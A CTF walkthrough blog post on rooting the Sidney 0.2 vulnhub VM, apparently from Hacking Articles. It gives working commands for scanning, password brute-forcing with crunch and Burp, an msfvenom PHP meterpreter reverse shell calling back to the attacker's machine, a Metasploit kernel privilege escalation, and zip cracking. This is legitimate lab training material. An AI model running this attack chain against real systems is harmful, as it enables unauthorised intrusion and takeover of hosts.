@@ -1,0 +1,419 @@
+
+								
+																		Hack the Sidney VM (CTF Challenge)
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on September 1, 2016
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									Today we will take up a boot2root challenge by Nightmares. We will work on Sidney: 0.2 made by Nightmares. This is the third challenge he genially came up with. The VM is set to grab a DHCP lease on boot. As before, gaining root is not the end of this VM. You will need to snag the flag. You can download this VM from –&gt; https://www.vulnhub.com/entry/sidney-02,149/
+Breaching Methodologies:
+
+Network Scanning (Nmap, netdiscover)
+webserver enumeration (view source)
+Directory brute-force (dirb)
+Generate own Dictionary (crunch)
+Login into the admin console
+Generate PHP Backdoor (Msfvenom)
+Upload and execute a backdoor
+Reverse connection (Metasploit)
+Kernel privilege escalation (Metasploit)
+Gain root access
+Penetrate for flag.zip
+Access Ram and finished the task
+
+First things we need to know what IP did the VM got. So naturally, scan the network using:
+
+		
+		
+			
+			
+			
+			
+netdiscover
+			
+				
+					
+				
+					1
+				
+						netdiscover
+					
+				
+			
+		
+
+
+Now that we have located our target IP i.e. 192.168.1.103, our next step is to scan it.
+
+		
+		
+			
+			
+			
+			
+nmap -A -p- 192.168.1.103
+			
+				
+					
+				
+					1
+				
+						nmap -A -p- 192.168.1.103
+					
+				
+			
+		
+
+
+Upon scanning we know that port number 80 is open that means this IP will open in the browser so let us try and do that.
+
+Then we decided to look into its page source.
+
+So we opened it in the browser (192.168.1.103/commorode64) and to our luck, we found another page.
+
+As you will read the page source you will come to know that username is robhubbard and going further you will find some hints about the password i.e. :
+
+the password is in lowercase
+the password has 3 letters and four digits
+and it is related to c=64 sound chip
+
+
+Then we run dirb for web directory brute-force attack and here it has shown so many directories. But I was interested in index.php and decide to explore it.
+
+So we opened it and as you can see it is asking for username and password. Now, we already know what is the username, we just have to find the password.
+
+Getting the above hints about the password, we first decided to look up the c=64 sound chip on Wikipedia. And we found:
+
+We knew that password’s first three digits are alphabetic letters and so our best guess is MOS is the first three digits of the password.
+Now everything falls on the last four digits of the password and finds that we used crunch command.
+
+		
+		
+			
+			
+			
+			
+crunch 7 7 -t mos%%%% -o /root/Desktop/dict.txt
+			
+				
+					
+				
+					1
+				
+						crunch 7 7 -t mos%%%% -o /root/Desktop/dict.txt
+					
+				
+			
+		
+
+
+Crunch will generate your dictionary file.
+And then apply dictionary attack using Burp Suite and then it will result in showing you the password as shown below:
+
+Now on the index.php page enter the username and password. The following page will open and on this page, you have to upload a malicious php file.
+
+Entering the password you will login to the following page:
+
+Now to generate the said php open the terminal in your Kali and type:
+
+		
+		
+			
+			
+			
+			
+msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.108 lport=4444 -f raw
+			
+				
+					
+				
+					1
+				
+						msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.108 lport=4444 -f raw
+					
+				
+			
+		
+
+Simultaneously start multi handler inside Metasploit framework.
+
+Copy the code from &lt;?php to die() and save it in a file with .php extension. Now upload this file by browsing it on the webpage.
+
+Meanwhile, return to the Metasploit terminal and wait for the meterpreter session by exploiting multi handler.
+
+		
+		
+			
+			
+			
+			
+msf use exploit/multi/handler
+msf exploit(multi/handler) set payload php/meterpreter/reverse_tcp
+msf exploit(multi/handler) set lhost 192.168.1.108
+msf exploit(multi/handler) set lport 4444
+msf exploit(multi/handler) exploit
+			
+				
+					
+				
+					12345
+				
+						msf use exploit/multi/handlermsf exploit(multi/handler) set payload php/meterpreter/reverse_tcpmsf exploit(multi/handler) set lhost 192.168.1.108msf exploit(multi/handler) set lport 4444msf exploit(multi/handler) exploit
+					
+				
+			
+		
+
+From given below image you can observe meterpreter session 1. But the task is not finished yet, still, we need to penetrate more for privilege escalation.
+
+By executing sysinfo we came to know about the target’s architecture i.e. kernel 4.4, and with help of this, we found Metasploit exploit for kernel privilege escalation. Further type following command:   
+
+		
+		
+			
+			
+			
+			
+use exploit/linux/local/bpf_priv_esc
+msf exploit(linux/local/bpf_priv_esc) &gt; set session 1
+msf exploit(linux/local/bpf_priv_esc) &gt; set lhost 192.168.1.108
+msf exploit(linux/local/bpf_priv_esc) &gt; set lport 8888
+msf exploit(linux/local/bpf_priv_esc) &gt; exploit
+			
+				
+					
+				
+					12345
+				
+						use exploit/linux/local/bpf_priv_escmsf exploit(linux/local/bpf_priv_esc) &gt; set session 1msf exploit(linux/local/bpf_priv_esc) &gt; set lhost 192.168.1.108msf exploit(linux/local/bpf_priv_esc) &gt; set lport 8888msf exploit(linux/local/bpf_priv_esc) &gt; exploit
+					
+				
+			
+		
+
+And it will give a 2nd meterpreter session with root privilege, now let’s get into the root directory and capture the flag.
+
+		
+		
+			
+			
+			
+			
+cd /root
+ls
+			
+				
+					
+				
+					12
+				
+						cd /rootls
+					
+				
+			
+		
+
+
+It gave us a hint.gif file, let’s download it.
+
+		
+		
+			
+			
+			
+			
+download hint.gif /root/Desktop/
+			
+				
+					
+				
+					1
+				
+						download hint.gif /root/Desktop/
+					
+				
+			
+		
+
+
+So when we opened hint.gif it has shown below image and I was unable to take-out hint from their conversation.
+
+Further, I execute the following command:
+
+		
+		
+			
+			
+			
+			
+cd .commodor64
+ls
+cd .miami
+ls
+cd vice
+ls
+			
+				
+					
+				
+					123456
+				
+						cd .commodor64lscd .miamilscd vicels
+					
+				
+			
+		
+
+Here is flag.zip file let’s download it on our desktop with help of the following command:
+
+		
+		
+			
+			
+			
+			
+download flag.zip /root/Desktop/
+			
+				
+					
+				
+					1
+				
+						download flag.zip /root/Desktop/
+					
+				
+			
+		
+
+
+We will apply dictionary attack using rockyou.txt so for this the command is:
+
+		
+		
+			
+			
+			
+			
+fcrackzip -vuD -p /usr/share/wordlists/rockyou.txt flag.zip
+			
+				
+					
+				
+					1
+				
+						fcrackzip -vuD -p /usr/share/wordlists/rockyou.txt flag.zip
+					
+				
+			
+		
+
+And yes, at last, you have the password. So now unzip the flag.zip by typing:
+
+		
+		
+			
+			
+			
+			
+unzip flag.zip
+			
+				
+					
+				
+					1
+				
+						unzip flag.zip
+					
+				
+			
+		
+
+Then it will ask you the password. Enter the recently obtained password here.
+
+And YAY!!!!! We have captured the Flag!!! Enjoy with it.
+
+Author: Yashika Dhir is a passionate Researcher and Technical Writer at Hacking Articles. She is a hacking enthusiast. contact here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
